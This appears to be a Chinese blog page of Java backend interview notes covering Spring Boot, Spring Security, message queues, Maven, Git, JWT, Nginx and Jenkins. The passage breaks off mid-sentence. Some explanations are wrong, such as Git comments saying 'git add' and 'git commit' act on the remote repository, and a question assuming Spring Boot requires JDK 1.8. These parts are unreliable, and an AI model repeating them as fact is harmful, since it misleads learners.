href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><ul><li>SpringBoot的作用</li><li>SpringBoot默认的端口号</li><li>SringBoot的核心注解</li><li>SringBoot启动原理</li><li>SpringBoot 自动配置原理</li><li>Spring Boot读取properties配置文件</li><li>SpringBoot的起步依赖</li><li>SpringBoot跟Spring之间的关系</li><li>Spring Boot的配置文件分类</li><li>Spring Boot 打 包</li><li>Spring Boot 中实现定时任务</li><li>SpringBoot是如何知道要创建哪个Bean的？</li><li>SpringBoot之常用注解</li><li>为什么Spring boot只能使用JDK1.8？</li><li>微服务中如何实现 session 共享 ?</li><li>前后端分离，如何维护接口文档 ?</li></ul><h2 id="SpringSecurity"><a href="#SpringSecurity" class="headerlink" title="SpringSecurity"></a>SpringSecurity</h2><ul><li>用户输入用户名和密码提交给后台</li></ul><ul><li>后台程序中如果整合的SpringSecurity，这个登录请求会被Security进行拦截</li></ul><ul><li>Security框架中的UsernamePasswordAuthenticationFilter这个过滤器会接收到用户名和密码并封装成一个Authentication</li></ul><ul><li>UsernamePasswordAuthenticationFilter会将封装好的Authentication传递给AuthenticationManager</li></ul><ul><li>AuthenticationManager然后将Authentication传递给DaoAuthenticationProvider</li></ul><ul><li>DaoAuthenticationProvider要调用UserDeatilsService获取数据库中或者内存中的用户名和密码</li></ul><ul><li>在DaoAuthenticationProvider中进行用户名和密码的校验</li></ul><ul><li><p>如果校验通过后往Authentication中填充信息并返回给UsernamePasswordAuthenticationFilter</p><p>UsernamePasswordAuthenticationFilter会判断Authentication对象是否为空<br> 如果为空说明用户输入的用户名和密码是是错误的 直接响应给客户端错误信息<br> 如果不为空说明用户输入的用户名和密码是正确的  然后把这个信息保存到Security的上下文中  方便在项目中获取使用</p></li></ul><h2 id="SpringCloud"><a href="#SpringCloud" class="headerlink" title="SpringCloud"></a>SpringCloud</h2><ul><li>Spring Cloud和SpringBoot的区别</li><li>Spring和Dubbo对比</li><li>SpringCloud的核心组件有哪些</li><li>你了解Spring CloudAlibaba吗?</li></ul><h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>优点：轻量，迅捷，容易部署和使用，拥有灵活的路由配置</p><p>缺点：性能和吞吐量不太理想，不易进行二次开发</p><ul><li>RabbitMQ 基本架构<ul><li>RabbitMQ是一款开源的，Erlang编写的，基于AMQP协议的消息中间件。</li><li><img src="C:/Users/ChaunceyZhang/AppData/Roaming/Typora/typora-user-images/image-20230206205115170.png" alt="image-20230206205115170"></li></ul></li><li>RabbitMQ是怎么实现通信的呢，RabbitMQ原理？</li><li>RabbitMQ有哪些工作模式？</li><li>MQ主要有3个有点优点<ul><li>解耦：降低系统的耦合性，提高可维护性。</li><li>异步提速：提升客户体验和系统的吞吐量。</li><li>削峰填谷：减少高峰期间对服务器的压力。</li></ul></li><li>但是MQ也有很多缺点<ul><li>系统可用性降低，本来不复杂的系统，又重新加入一个消息队列，如果消息队列挂了，那么整个系统就会崩溃，系统的可用性降低了。</li><li>系统复杂性提高，加入消息队列以后要考虑很多方面的事情，比如一致性问题，如果保证消息不会被重复消费，如何保证消息的可靠传输等</li><li>一致性问题，A系统处理完后直接返回成功，那么就请求成功了，但是限制BCD三个系统，BC写库成功，但是D写库失败，那么就会出现数据不一致的问题。</li><li>消息顺序问题，A和B两个消息，B消息被消费的前提是A消息先被消费，那就对消息的执行顺序就有要求。</li></ul></li><li>MQ中一个非常重要的问题就是如何防止消息丢失？</li><li>如何保证消息的可靠性？</li><li>如何保证消息不被重复消费？</li><li>死信队列和TTL过期时间可以产生延迟队列的效果？</li><li>如何解决消息队列的延时和过期失效问题？</li><li>有几百万的消息持续积压几小时，说说怎么解决？</li><li>消息队列满了之后怎么处理？</li><li>怎么自己设计一个MQ？</li></ul><h2 id="RockerMQ"><a href="#RockerMQ" class="headerlink" title="RockerMQ"></a>RockerMQ</h2><p>优点：性能好，高吞吐量，稳定可靠，有活跃的中文社区</p><p>缺点：兼容性上不是太好，支持的客户端语言不多，目前是 Java 及 c++，其中 c++ 不成熟</p><ul><li>RoctetMQ 基本架构<ul><li><img src="C:/Users/ChaunceyZhang/AppData/Roaming/Typora/typora-user-images/image-20230207100354864.png" alt="image-20230207100354864"></li><li>RocketMQ 一共有4个部分组成，为了保证高可用，一般每一部分都是集群部署的</li></ul></li><li>RocketMQ 的整体工作流程</li><li>如何保证消息的可用性 / 可靠性 / 不丢失呢？</li><li>如何处理消息重复的问题呢？</li><li>怎么处理消息积压？</li><li>顺序消息如何实现？</li><li>如何实现消息过滤？</li><li>如何实现延时消息?</li><li>怎么实现分布式消息事务的？半消息？</li><li>死信队列知道吗？</li><li>如何保证 RocketMQ 的高可用？</li><li>RocketMQ重试次数</li><li>为什么 RocketMQ 不使用 Zookeeper 作为注册中心呢？</li><li>Broker 是怎么保存数据的呢？</li><li>RocketMQ 怎么对文件进行读写的？</li><li>消息刷盘怎么实现的呢？</li><li>能说下 RocketMQ 的负载均衡是如何实现的？</li></ul><h2 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h2><p>优点：拥有强大的性能及吞吐量，兼容性很好</p><p>缺点：由于 “攒一波再处理” 导致延迟比较高</p><ul><li>Kafka基本架构<ul><li><img src="C:/Users/ChaunceyZhang/AppData/Roaming/Typora/typora-user-images/image-20230207100845874.png" alt="image-20230207100845874"></li></ul></li><li>什么是kafka?</li><li>kakfa的应用场景?</li><li>kafka的优缺点?</li><li>kafka的关系图?</li><li>kafka有什么问题?</li><li>kafkaStream</li></ul><h2 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h2><ul><li><h2 id="Java基本数据类型？"><a href="#Java基本数据类型？" class="headerlink" title="Java基本数据类型？"></a>Java基本数据类型？</h2></li><li>面向对象的三大特性？</li><li>JDK和JRE的区别？</li><li>Java支持多继承和多实现吗？</li><li>构造函数和一般函数有什么区别呢？</li><li>运行时异常都有哪些？</li><li>抽象类和接口的区别？</li><li>为什么重写equals方法，还必须要重写hashcode方法?</li><li>==和equals()?</li><li>String、StringBuffer、StringBuilder?</li><li>String常量池？</li><li>java怎么创建对象？<ul><li>使用 new 关键字</li><li>使用 newInstance() 方法</li><li>使用 clone() 方法</li><li>使用反序列化的 readObject() 方法</li></ul></li></ul><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><ul><li><p>Maven 是什么？</p><ul><li>Maven 主要服务于基于 Java 平台的项目构建、依赖管理和项目信息管理。</li><li>Maven 的主要功能主要分为 4 点：<ul><li>依赖管理系统</li><li>多模块构建</li><li>一致的项目结构</li><li>一致的构建模型和插件机制</li></ul></li></ul></li><li><p>项目为什么选用 Maven 进行构建？</p><ul><li>首先，Maven 是一个优秀的项目构建工具。使用maven，可以很方便的对项目进行分模块构建，这样在开发和测试打包部署时，效率会提高很多。</li><li>其次，Maven 可以进行依赖的管理。使用 Maven ，可以将不同系统的依赖进行统一管理，并且可以进行依赖之间的传递和继承。</li><li>添加第三方jar包<ul><li>按照最原始的做法，我们是手动复制jar包到项目WEB-INF/lib下，每个项目都会有一份，造成大量重复文件。而Maven将jar包放在本地仓库中统一管理，需要jar包只需要用坐标的方式引用即可。</li></ul></li><li>获取第三方jar包<ul><li>开发过程中我们需要用到很多jar包，每个jar包在官网获取的方式不尽相同，给工作带来了额外困难。但是使用Maven可以以坐标的方式依赖一个jar包，Maven从中央仓库进行下载，并同时下载这个jar包依赖的其他jar包。</li></ul></li><li>将项目拆分为多个工程模块</li></ul></li><li><p>Maven的优点</p><ul><li>简化了项目依赖管理</li><li>易于上手，对于新手来说了解几个常用命令即可满足日常工作</li><li>便于与持续集成工具（jenkins）整合</li><li>便于项目升级，无论是项目本身还是项目使用的依赖</li><li>maven有很多插件，便于功能扩展，比如生产站点，自动发布版本等</li><li>为什么使用Maven中的各点</li></ul></li><li><p>Maven的缺点</p><ul><li>Maven是一个庞大的构建系统，学习难度大。入门容易，但是精通难。</li><li>②Maven采用约定约定优于配置的策略，虽然上手容易但是一旦出现问题，难于调试</li><li>③中国网络环境较差，很多repository无法访问</li></ul></li><li><p>Maven依赖的解析机制</p><ul><li>当依赖的范围是 system 的时候，Maven 直接从本地文件系统中解析构件。</li><li>根据依赖坐标计算仓库路径，尝试直接从本地仓库寻找构件，如果发现对应的构件，就解析成功。</li><li>如果在本地仓库不存在相应的构件，就遍历所有的远程仓库，发现后，下载并解析使用。</li><li>如果依赖的版本是 RELEASE 或  LATEST，就基于更新策略读取所有远程仓库的元数据文件（groupId/artifactId/maven-metadata.xml），将其与本地仓库的对应元合并后，计算出 RELEASE 或者 LATEST 真实的值，然后基于该值检查本地仓库，或者从远程仓库下载。</li><li>如果依赖的版本是 SNAPSHOT，就基于更新策略读取所有远程仓库的元数据文件，将它与本地仓库对应的元数据合并，得到最新快照版本的值，然后根据该值检查本地仓库，或从远程仓库下载。</li><li>如果最后解析得到的构件版本包含有时间戳，先将该文件下载下来，再将文件名中时间戳信息删除，剩下 SNAPSHOT 并使用（以非时间戳的形式使用）。</li></ul></li><li><p>Maven版本规则</p><ul><li>主版本：一般来说代表了项目的重大的架构变更</li><li>次版本：一般代表了一些功能的增加或变化，但没有架构的变化</li><li>增量版本：一般是一些小的 bug fix ，不会有重大的功能变化</li></ul></li><li><p>Maven依赖原则</p><ul><li>最短路径原则（依赖传递的路径越短越优先）</li><li>pom文件申明顺序优先（路径长度一样，则先申明的优先）</li><li>覆写原则（当前pom文件里申明的直接覆盖父工程传过来的）</li></ul></li><li><p>如何解决依赖传递引起的版本冲突?</p><ul><li>可通过dependency的exclusion元素排除掉依赖</li></ul></li><li><p>如何管理多模块项目依赖的版本?</p><ul><li>通过在父模块中声明dependencyManagement和pluginManagement，  然后让子模块通过<parent>元素指定父模块，这样子模块在定义依赖是就可以只定义groupId和artifactId，自动使用父模块的version,这样统一整个项目的依赖的版本。</li></ul></li><li><p>如何聚合多模块?</p><ul><li>配置一个打包类型为pom的聚合模块，然后在该pom中使用<module>元素声明要聚合的模块。</li></ul></li></ul><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 常用</span><br><span class="line">$ git init    # 初始化仓库</span><br><span class="line">$ git add .   # 将当前目录下文件全部加到远程仓库中（master）</span><br><span class="line">$ git commit  # 提交到远程仓库（默认的master分支）  用的蛮多的</span><br><span class="line">$ git clone   # 将远程仓库拷贝到本地    </span><br><span class="line">如 git clone ssh://git@<span class="number">10.10</span>.<span class="number">8.64</span>:<span class="number">9922</span>/pythonapi/api-daily-supervision.git</span><br><span class="line">$ git status  # 查看当前仓库的状态</span><br><span class="line">$ git log     # 查看历史提交记录，这个我用的还是蛮多的</span><br><span class="line">$ git diff [file]  # 查看暂存区和工作区的差异  个人用其实就是看些对文件做的改变有哪些，删除或者增加了哪些东西</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 关于回退</span><br><span class="line">$ git reset  # 回退版本 ，有下面三种形式</span><br><span class="line">git reset --soft          # 将HEAD引用指向给定提交, 索引（暂存区）和工作目录的内容是不变的</span><br><span class="line">git reset --mixed（git reset默认的模式）     # HEAD引用指向给定提交，并且索引（暂存区）内容也跟着改变，工作目录内容不变</span><br><span class="line">git reset --hard           # HEAD引用指向给定提交，索引（暂存区）内容和工作目录内容都会变给定提交时的状态</span><br><span class="line">git reset --hard HEAD^   # 回退到上个版本</span><br><span class="line">git reset --hard HEAD~<span class="number">3</span>  # 回退到前<span class="number">3</span>次提交之前，以此类推，回退到n次提交之前</span><br><span class="line">git reset --hard commit_id     # 退到/进到 指定commit的sha码</span><br><span class="line">如 git reset --hard <span class="number">125</span>dcfaa558e3276b30b6b2e5cbbb9c00bbdca96 </span><br><span class="line"></span><br><span class="line"># 关于push    <span class="string">&#x27;git push&#x27;</span> </span><br><span class="line"></span><br><span class="line">git remote -v    # 查看远程仓库</span><br><span class="line">git remote add [本地版本库] [url]   # 添加远程仓库 </span><br><span class="line"></span><br><span class="line"># 例如： 提交本地到远程仓库的master</span><br><span class="line">$ git remote add origin git@<span class="number">10.10</span>.<span class="number">8.64</span>:<span class="number">9922</span>/pythonapi/api-daily-supervision.git  </span><br><span class="line">$ git push -u origin master</span><br><span class="line"></span><br><span class="line">$ git push -f -u origin 远程分支   # 强制提交到远程分支</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 关于pull   <span class="string">&#x27;git pull&#x27;</span></span><br><span class="line">$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;   # 命令格式</span><br><span class="line">例如： 远程主机 origin 的 master 分支拉取过来，与本地的 develop分支合并。</span><br><span class="line">git pull origin master:develop</span><br><span class="line"></span><br><span class="line"># 一些说明-------------</span><br><span class="line"># git pull 其实是git fetch 和 git merge FETCH_HEAD 的简写，</span><br><span class="line"># 简单说，就是你在开始写代码时，先pull一下，拉取最新的代码，如果没用pull，后面再merger在一起就可以嘞，这个用的还是蛮多的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 关于分支  这个我用的不多，主要也就下面这几个</span><br><span class="line">$  git branch     # 列出本地的分支</span><br><span class="line">$  git branch (branch_name)    # 创建分支</span><br><span class="line">$  git checkout (branch_name)  # 切换分支 </span><br><span class="line">$  git branch -d branch_name   # 删除某分支</span><br></pre></td></tr></table></figure><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><ul><li><p>什么是JWT?</p><ul><li>WT (全称：Json Web Token)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为 JSON 对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</li><li>简单点说就是一种认证机制，让后台知道该请求是来自于受信的客户端。</li></ul></li><li><p>jwt和security的区别？</p><ul><li>JWT优点：<ul><li>无需再服务端存储用户数据，减轻服务端压力</li><li>轻量级，json风格，比较简单</li><li>跨语言</li></ul></li><li>JWT的缺点：<ul><li>token一旦签发，无法修改   <ul><li>无法更新token有效期，用户登录状态刷新难以实现</li><li>无法销毁一个token，服务端不能对用户状态进行绝对控制</li></ul></li><li>不包含权限控制</li></ul></li><li>SpringSecurity：<ul><li>优点：   <ul><li>用户信息保存再服务端，服务端可以对用户状态绝对控制</li><li>基于Spring，无缝整合，修改登录逻辑，其实就是添加过滤器</li><li>整合权限管理</li></ul></li><li>缺点：   <ul><li>限定了语音</li><li>实现复杂，基于一连串的过滤器链</li><li>需要再服务端保存用户信息，增加服务端压力</li></ul></li></ul></li></ul></li><li><p>你们使用JWT做登录凭证，如何解决token注销问题</p><p>jwt的缺陷是token生成后无法修改，因此无法让token失效。只能采用其它方案来弥补，基本思路如下</p><p>方案一：</p><ul><li>适当减短token有效期，让token尽快失效</li><li>删除客户端cookie</li><li>服务端对失效token进行标记，形成黑名单，虽然有违无状态特性，但是因为token有效期短，因此标记 时间也比较短。服务器压力会比较小</li></ul><p>方案二：</p><ul><li>用户登录后    ，生成JWT</li><li>把JWT的id存入redis，只有redis中有id的JWT，才是有效的JWT</li><li>退出登录时，把ID从Redis删除即可</li></ul></li><li><p>既然token有效期短，怎么解决token失效后的续签问题？</p><ul><li>在验证用户登录状态的代码中，添加一段逻辑：判断cookie即将到期时，重新生成一个token。比如token有效期为30分钟，当用户请求我们时，我们可以判断如果用户的token有效期还剩下10分钟，那么就重新生成token。因此用户只要在操作我们的网站，就会续签token</li></ul></li><li><p>如何解决异地登录问题？</p><ul><li>JWT设计为了实现无状态的登录，因此token无法修改，难以实现异地登录的判断，或者强制让登录token失效。<br>因此如果有类似需求， 就不应选择JWT作为登录方案，而是使用传统session登录方案。<br>但是，如果一定要用JWT实现类似要过，就需要在Redis中记录登录用户的JWT的token信息，这样就成了有状态的登录，还不如一开始就选择Session方案。</li></ul></li><li><p>如何解决cookie被盗用问题？</p><p>cookie被盗用的可能性主要包括下面几种：</p><ul><li>XSS攻击：这个可以再前端页面渲染时对 数据做安全处理即可，而且我们的cookie使用了Httponly为true，可以防止JS脚本的攻击。</li><li>CSRF攻击：利用Referer头，防盗链，请求头中加随机码</li><li>抓包，获取用户cookie：我们采用了HTTPS协议通信，无法获取请求的任何数据</li><li>请求重放攻击：对于普通用户的请求没有对请求重放做防御，而是对部分业务做好了幂等处理。运行管理系统中会对token添加随机码，认证token一次有效，来预防请求重放攻击。</li><li>用户电脑中毒：这个无法防范。</li></ul></li><li><p>用户的cookie被禁用怎么办？</p><ul><li>cookie一般情况下，是不会被禁用，因为普通人根本不知道是什么是cookie，一般不用管，为了友好，我们可以给用户一个提示：你的cookie已经被禁用了，请启用cookie。</li><li>把jwt作为响应头返回，浏览器中JS把token写到本地存储（sessionStorage），要求前端每次发ajax，都必须自己携带token。而且有被xss攻击的风险</li></ul></li><li><p>如何解决cookie被篡改问题？</p><ul><li>cookie可以篡改，但是签名无法篡改，否则服务端认证根本不会通过</li></ul></li><li><p>如何完成权限校验的？</p><ul><li>首先我们有权限管理的服务，管理用户的各种权限，及可访问路径等</li><li>在网关zuul中利用Pre过滤器，拦截一切请求，在过滤器中，解析jwt，获取用户身份，查询用户权限，判断用户身份可以访问当前路径</li></ul></li><li><p>服务端微服务地址不小心暴露了，用户就可以绕过网关，直接访问微服务，怎么办？</p><ul><li><p>首先，我们的微服务隐藏在网关的后面，而且整个服务被Nginx反向代理，用户只能看到nginx的地址，微服务暴露的可能性很低。</p></li><li><p>然后，即便真的暴露了，我们的微服务都做了严格的服务间鉴权处理，任何对微服务的访问都会被验证是否有授权，如果没有则会被拦截。具体实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">会有一张表记录每个微服务的id，和密钥信息</span><br><span class="line">服务启动时，需要去授权中心，认证身份，携带id和secret</span><br><span class="line">授权中心认证通过，会颁发一个JWT给微服务</span><br><span class="line">微服务访问其它服务时，需要携带JWT</span><br><span class="line">被访问的服务，需要验证JWT，如果没有携带，或token时伪造的拦截请求即可</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Xxl-job"><a href="#Xxl-job" class="headerlink" title="Xxl-job"></a>Xxl-job</h2><ul><li><p>为什么需要任务调度平台?</p><ul><li>定时任务是程序员不可避免的话题，很多业务场景需要我们某一特定的时刻去做某件任务。一般来说，系统可以使用消息传递代替部分定时任务（比如商品成功发货后，需要向客户发送短信提醒），两者有很多相似之处，一些场景下也可以相互替换，但是有一些不能：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">时间驱动/ 事件驱动： 内部系统一般可以通过事件来驱动，但如果涉及到外部系统，则只能使用时间驱动。如爬取外部网站价格，每小时爬一次。</span><br><span class="line">批量处理/ 逐条处理： 批量处理堆积的数据更加高效，在不需要实时性的情况下比消息中间件更有优势。而且有的业务逻辑只能批量处理，如移动每个月结算我们的花费。</span><br><span class="line">实时性/ 非实时性： 消息中间件能够做到实时处理数据，但是有些情况下并不需要实时，比如：vip 升级。</span><br><span class="line">系统内部/ 系统解耦： 定时任务调度一般是在系统内部，而消息中间件可用于两个系统间</span><br></pre></td></tr></table></figure><ul><li>并且对于分布式系统来说，如果处理不当，会存在同一系统不同节点之间定时任务相互影响的问题，再考虑上监控、日志、信息面板，加上不同系统之间管理维护的问题，自己实现一套的成本又上来了..所以我们可以考虑一些比较成熟的任务调度平台来使用。</li></ul></li></ul><ul><li>任务调度框架选型?<ul><li>xxl-job：是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展 。</li><li>Elastic-Job： 当当开源的分布式调度解决方案，由两个相互独立的子项目Elastic-Job-Lite和Elastic-Job-Cloud组成；Elastic-Job-Lite定位为轻量级无中心化解决方案，使用jar包的形式提供分布式任务的协调服务；Elastic-Job-Cloud采用自研Mesos Framework的解决方案，额外提供资源治理、应用分发以及进程隔离等功能；</li><li>Saturn：是唯品会开源的一个分布式任务调度平台，在当当开源的Elastic Job基础上，取代传统的Linux Cron/Spring Batch Job的方式，做到全域统一配置，统一监控，任务高可用以及分片并发处理；</li><li>light-task-scheduler：阿里员工开源的个人项目,主要用于解决分布式任务调度问题，支持实时任务，定时任务和Cron任务。有较好的伸缩性，扩展性，健壮稳定性<br>Quartz: Java定时任务的标配。利用数据库的锁机制实现集群调度，业务代码需要考虑调度的逻辑，对业务代码有入侵。</li></ul></li></ul><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><ul><li>什么是Nginx?<ul><li>Nginx是一个 轻量级/高性能的反向代理Web服务器，用于 HTTP、HTTPS、SMTP、POP3 和 IMAP 协议。他实现非常高效的反向代理、负载平衡，他可以处理2-3万并发连接数，官方监测能支持5万并发。</li></ul></li></ul><ul><li>Nginx 有哪些优点？<ul><li>跨平台、配置简单。</li><li>非阻塞、高并发连接：处理 2-3 万并发连接数，官方监测能支持 5 万并发。</li><li>内存消耗小：开启 10 个 Nginx 才占 150M 内存。</li><li>成本低廉，且开源。</li><li>稳定性高，宕机的概率非常小。</li><li>内置的健康检查功能：如果有一个服务器宕机，会做一个健康检查，再发送的请求就不会发送到宕机的服务器了。重新将请求提交到其他的节点上</li></ul></li></ul><ul><li> Nginx应用场景？</li><li>http服务器。Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。</li><li>虚拟主机。可以实现在一台服务器虚拟出多个网站，例如个人网站使用的虚拟机。</li><li>反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且</li><li>台服务器可以平均分担负载，不会应为某台服务器负载高宕机而某台服务器闲置的情况。</li><li>nginx 中也可以配置安全管理、比如可以使用Nginx搭建API接口网关,对每个接口服务进行拦截</li></ul><ul><li> Nginx怎么处理请求的？</li><li>Nginx 在启动时，会解析配置文件，得到需要监听的端口与 IP 地址，然后在 Nginx 的 Master进程里面先初始化好这个监控的Socket(创建 S ocket，设置 addr、reuse 等选项，绑定到指定的 ip 地址端口，再listen 监听)。</li><li>再 fork(一个现有进程可以调用 fork 函数创建一个新进程。由 fork 创建的新进程被称为子进程 )出多个子进程出来。子进程会竞争 accept 新的连接。此时，客户端就可以向 nginx 发起连接了。当客户端与nginx进行三次握手，与nginx 建立好一个连接后。此时，某一个子进程会 accept 成功，得到这个建立好的连接的 Socket ，然后创建 nginx</li><li>对连接的封装，即 ngx_connection_t 结构体。设置读写事件处理函数，并添加读写事件来与客户端进行数据的交换。</li><li>最后，Nginx 或客户端来主动关掉连接，到此，一个连接就结束了。</li></ul><ul><li><p>Nginx 是如何实现高并发的？</p><ul><li><p>如果一个 server 采用一个进程(或者线程)负责一个request的方式，那么进程数就是并发数s。那么显而易见的，就是会有很多进程在等待中。等什么？最多的应该是等待网络传输。</p></li><li><p>而 Nginx 的异步非阻塞工作方式正是利用了这点等待的时间。在需要等待的时候，这些进程就空闲出来待命了。因此表现为少数几个进程就解决了大量的并发问题。</p></li><li><p>Nginx是如何利用的呢，简单来说：同样的 4 个进程，如果采用一个进程负责一个 request 的方式，那么，同时进来 4 个 request 之后，每个进程就负责其中一个，直至会话关闭。期间，如果有第 5 个request进来了。就无法及时反应了，因为 4 个进程都没干完活呢，因此，一般有个调度进程，每当新进来了一个 request ，就新开个进程来处理。</p></li><li><p>Nginx 不这样，每进来一个 request ，会有一个 worker 进程去处理。但不是全程的处理，处理到什么程度呢？</p><ul><li>处理到可能发生阻塞的地方，比如向上游（后端）服务器转发 request ，并等待请求返回。</li><li>那么，这个处理的 worker 不会这么傻等着，他会在发送完请求后，注册一个事件：“如果 upstream 返回了，告诉我一声，我再接着干”。于是他就休息去了。</li><li>此时，如果再有 request 进来，他就可以很快再按这种方式处理。</li><li>而一旦上游服务器返回了，就会触发这个事件，worker 才会来接手，这个 request 才会接着往下走。</li></ul></li><li><p>这就是为什么说，Nginx 基于事件模型。<br>由于 web server 的工作性质决定了每个 request 的大部份生命都是在网络传输中，实际上花费在 server 机器上的时间片不多。这是几个进程就解决高并发的秘密所在。即：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webserver 刚好属于网络 IO 密集型应用，不算是计算密集型。</span><br><span class="line">异步，非阻塞，使用 epoll ，和大量细节处的优化。也正是 Nginx 之所以然的技术基石。</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>正向代理？<ul><li>代理端代理的是客户端</li></ul></li><li>反向代理？<ul><li>代理端代理的是服务端</li></ul></li><li>反向代理服务器的优点？<ul><li>反向代理服务器可以隐藏源服务器的存在和特征</li></ul></li></ul><h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><ul><li>jenkins是什么？<ul><li>Jenkins是一个开源的、可扩展的持续集成、交付、部署（软件/代码的编译、打包、部署）的基于web界面的平台。允许持续集成和持续交付项目，无论用的是什么平台，可以处理任何类型的构建或持续集成。</li></ul></li></ul><p>​    </p><ul><li>为什么使用jenkins？<ul><li>Jenkins是一种使用Java编程语言编写的开源持续集成软件工具，用于实时测试和报告较大代码库中的孤立更改。 Jenkins软件使开发人员能够快速找到并解决代码库中的缺陷，并自动进行构建测试。</li></ul></li></ul><ul><li>CI/CD是什么？<ul><li>CI<ul><li>CI(Continuous integration，中文意思是持续集成)是一种软件开发时间。持续集成强调开发人员提交了新代码之后，立刻进行构建、（单元）测试。根据测试结果，我们可以确定新代码和原有代码能否正确地集成在一起。</li></ul></li><li>CD<ul><li>CD(Continuous Delivery， 中文意思持续交付)是在持续集成的基础上，将集成后的代码部署到更贴近真实运行环境(类生产环境)中。比如，我们完成单元测试后，可以把代码部署到连接数据库的Staging环境中更多的测试。如果代码没有问题，可以继续手动部署到生产环境。</li></ul></li></ul></li></ul><ul><li>集中常见的CI工具?<ul><li>Jenkins</li><li>TeamCity</li><li>Travis</li><li>CIGo</li><li>CDBamboo</li><li>GitLabCI</li><li>CircleCI</li><li>Codeship</li></ul></li></ul><ul><li>什么是Jenkins pipeline?<ul><li>Pipeline，简而言之，就是一台运行于Jenkins上的工作流框架，将原本独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排与可视化。<br>Jenkins Pipeline是一组插件，让Jenkins可以实现持续交付管道的落地和实施。</li></ul></li></ul><ul><li>为什么在jenkins中使用管道?<ul><li>Pipeline在Jenkins上添加了一套强大的自动化工具，支持从简单的持续集成到全面的持续交付管道的用例。 通过对一系列相关任务进行建模，用户可以利用Pipeline的许多功能： <ul><li>代码：流水线是用代码实现的，通常会检查到源代码管理中，从而使团队能够编辑，查看和迭代其交付流水线。</li><li>耐用：管道可以在Jenkins主服务器的计划内和计划外重启中生存。</li><li>可暂停：管道可以选择停止并等待人工输入或批准，然后再继续管道运行。</li><li>多功能：管道支持复杂的现实世界中的连续交付需求，包括加入，循环和并行执行工作的能力。</li></ul></li></ul></li></ul><ul><li>什么是jenkinsfile?为什么使用jenkinsfile?<ul><li>Jenkinsfile是一个文本文件，其中包含Jenkins Pipeline的定义，并已签入源代码管理<br>虽然用于定义管道的脚本语法和jenkinsfile类似，但通常认为在项目中定义管道Jenkinsfile并检查源代码管理是最佳实践。</li><li>为所有分支和请求自动创建一个管道构建过程。<br>管道上的代码审查/迭代。<br>审核追踪管道</li></ul></li></ul><ul><li>什么是Blue Ocean?<ul><li>Blue Ocean是pipeline的可视化UI。同时他兼容经典的自由模式的job。Jenkins Pipeline从头开始设计，但仍与自由式作业兼容，Blue Ocean减少了经典模式下的混乱并为团队中的每个成员增加了清晰度。</li><li>Blue Ocean的主要特点包括：<ul><li>连续交付（CD）管道的复杂可视化，可以让您快速直观地理解管道状态。</li><li>管道编辑器 - 通过引导用户通过直观和可视化的过程来创建管道，从而使管道的创建变得平易近人。</li><li>个性化以适应团队中每个成员的基于角色的需求。</li><li>在需要干预和/或出现问题时确定精确度。Blue Ocean显示的标注了关键步骤，促进异常处理和提高生产力。</li></ul></li></ul></li></ul><ul><li>如何在jenkins中备份和复制文件?<ul><li>创建备份，需要做的就是定期备份JENKINS_HOME目录。 </li><li>这包含所有构建作业配置，从属节点配置以及构建历史记录。</li><li> 要创建Jenkins设置的备份，只需复制此目录。</li></ul></li></ul><ul><li>jenkins的优势是什么?<ul><li>Jenkins的优势包括：<ul><li>在开发环境的早期阶段, 